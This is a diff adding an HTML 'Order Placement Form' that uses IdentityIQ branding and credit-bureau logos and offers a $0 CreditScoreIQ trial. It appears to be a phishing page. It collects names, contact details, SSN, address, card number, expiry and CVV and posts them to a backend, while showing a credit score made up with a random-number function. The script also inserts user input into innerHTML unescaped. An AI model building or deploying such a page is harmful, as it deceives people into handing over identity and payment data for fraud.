@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order Placement Form</title>
+    <style>
+        /* Global Styles */
+        body {
+            margin: 0;
+            font-family: 'Crimson Text', serif;
+            line-height: 1.6;
+            color: rgba(98, 98, 98, 1);
+            background-color: #fff;
+        }
+
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 42px;
+            font-weight: 600;
+            color: rgba(34, 34, 34, 1);
+            text-align: center;
+            margin: 0;
+        }
+
+        p {
+            font-family: 'Crimson Text', serif;
+            font-size: 20px;
+            text-align: justify;
+            margin: 20px 0;
+            max-width: 600px;
+        }
+
+        .container {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            padding: 50px;
+            gap: 40px;
+        }
+
+        /* Banner Image */
+        .banner {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .banner img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Form Container */
+        .form-container {
+            background: rgba(246, 156, 7, 0.1); /* Subtle background for the form */
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
+        }
+
+        label {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 16px;
+            font-weight: bold;
+            color: rgba(34, 34, 34, 1);
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(34, 34, 34, 0.2);
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus,
+        select:focus {
+            border-color: rgba(246, 156, 7, 1);
+            outline: none;
+        }
+
+        .btn {
+            display: inline-block;
+            text-align: center;
+            background: rgba(246, 156, 7, 0.75);
+            color: rgba(255, 255, 255, 1);
+            font-family: 'Montserrat', sans-serif;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 90px;
+            border-radius: 100px;
+            border: 3px solid rgba(1, 77, 130, 1);
+            text-decoration: none;
+            transition: all 0.3s ease-in-out;
+            box-shadow: none;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: rgba(246, 156, 7, 1);
+            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.2);
+        }
+
+        /* Order Summary Box */
+        .order-summary {
+            position: sticky;
+            top: 20px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            width: 300px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .order-summary h3 {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0 0 15px;
+        }
+
+        .order-summary p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .order-summary strong {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .order-summary a {
+            color: blue;
+            text-decoration: underline;
+        }
+
+        .order-summary .total-due {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        /* Credit Bureau Logos */
+        .bureau-logos {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .bureau-logos img {
+            max-width: 150px;
+        }
+
+        @media only screen and (max-width: 800px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .form-container {
+                padding: 20px;
+            }
+
+            .btn {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+
+            .order-summary {
+                position: static;
+                width: 100%;
+                margin-top: 20px;
+            }
+        }
+
+        /* Added Styles for Result Display */
+        .result-container {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 16px;
+            color: rgba(34, 34, 34, 1);
+        }
+
+        .credit-score {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .user-details {
+            font-size: 14px;
+            color: rgba(98, 98, 98, 1);
+        }
+    </style>
+</head>
+<body>
+    <!-- Banner Image -->
+    <div class="banner">
+        <img src="https://member.identityiq.com/WebResources/BusinessLogo/2023-01-27T202510.287Z.png" alt="IdentityIQ Logo">
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Order Placement Form -->
+        <div class="form-container">
+            <form id="orderForm" action="/api/submit" method="POST">
+                <!-- Title, First Name, Last Name -->
+                <label for="title">Title</label>
+                <select id="title" name="title" required>
+                    <option value="" disabled selected>Select Title</option>
+                    <option value="mr">Mr.</option>
+                    <option value="mrs">Mrs.</option>
+                    <option value="miss">Miss</option>
+                    <option value="ms">Ms.</option>
+                </select>
+
+                <label for="firstName">First Name</label>
+                <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>
+
+                <label for="lastName">Last Name</label>
+                <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>
+
+                <!-- Email and Phone Number -->
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="example@example.com" required>
+
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+
+                <!-- SSN (Optional) -->
+                <label for="ssn">SSN (Optional)</label>
+                <input type="text" id="ssn" name="ssn" placeholder="Enter your SSN">
+
+                <!-- Address -->
+                <label for="address">Complete Address</label>
+                <input type="text" id="address" name="address" placeholder="Street Address" required>
+                <input type="text" id="city" name="city" placeholder="City" required>
+                <input type="text" id="zip" name="zip" placeholder="Post Code / ZIP Code" required>
+
+                <!-- Payment Details -->
+                <label>Payment Information</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required>
+                <div style="display: flex; gap: 15px;">
+                    <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" required>
+                    <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn">Submit Order</button>
+            </form>
+
+            <!-- Result Container -->
+            <div id="resultContainer" class="result-container" style="display: none;">
+                <div class="credit-score" id="creditScore"></div>
+                <div class="user-details" id="userDetails"></div>
+            </div>
+        </div>
+
+        <!-- Order Summary Box -->
+        <aside class="order-summary">
+            <h3>Order Summary</h3>
+            <p><strong>CreditScoreIQ Trial</strong></p>
+            <p><strong>7 Days Trial for $0.00</strong></p>
+            <p><strong>Then $3.99/mo</strong></p>
+            <ul style="padding: 0; list-style: none;">
+                <li>3 Bureau Credit Report & Scores</li>
+                <li><a href="#">ScoreCasterIQ</a></li>
+                <li><u>Enhanced Credit Monitoring</u></li>
+            </ul>
+            <p><a href="#">More</a></p>
+            <p class="total-due"><strong>Total Due: $0.00</strong></p>
+        </aside>
+    </div>
+
+    <!-- Credit Bureau Logos -->
+    <div class="bureau-logos">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5042fa874d_366-3666850_transunion-logo-png-transparent-png.png" alt="TransUnion Logo">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5043f0f704_Experian-Logo.wine.png" alt="Experian Logo">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5044e53fc5_equifax-logo-vector.svg" alt="Equifax Logo">
+    </div>
+
+    <script>
+        // Function to generate a random credit score
+        function generateRandomCreditScore() {
+            const ranges = [
+                { min: 300, max: 579, rating: "🚫 Poor", meaning: "High risk to lenders; credit approval is hard" },
+                { min: 580, max: 669, rating: "⚠️ Fair", meaning: "Below average; limited options or higher rates" },
+                { min: 670, max: 739, rating: "✅ Good", meaning: "Average or slightly above; generally approved" },
+                { min: 740, max: 799, rating: "🌟 Very Good", meaning: "Low risk; better rates and offers" },
+                { min: 800, max: 850, rating: "💎 Excellent", meaning: "Top tier; best rates and premium approvals" }
+            ];
+
+            // Randomly select a range
+            const range = ranges[Math.floor(Math.random() * ranges.length)];
+            const score = Math.floor(Math.random() * (range.max - range.min + 1)) + range.min;
+
+            return {
+                score,
+                rating: range.rating,
+                meaning: range.meaning
+            };
+        }
+
+        // Handle form submission
+        document.getElementById('orderForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Get form values
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+
+            // Generate random credit score
+            const creditScoreData = generateRandomCreditScore();
+
+            // Display the result
+            const resultContainer = document.getElementById('resultContainer');
+            const creditScoreElement = document.getElementById('creditScore');
+            const userDetailsElement = document.getElementById('userDetails');
+
+            creditScoreElement.innerHTML = `
+                Your Credit Score: ${creditScoreData.score} (${creditScoreData.rating})<br>
+                ${creditScoreData.meaning}
+            `;
+            userDetailsElement.innerHTML = `
+                Name: ${firstName} ${lastName}<br>
+                Email: ${email}<br>
+                Phone: ${phone}
+            `;
+
+            // Show the result container
+            resultContainer.style.display = 'block';
+
+            // Submit the form data to the backend API
+            const formData = new FormData(e.target);
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(Object.fromEntries(formData.entries())),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        console.log('Form submitted successfully!');
+                    } else {
+                        console.error('Error submitting form:', data.error);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+</html>
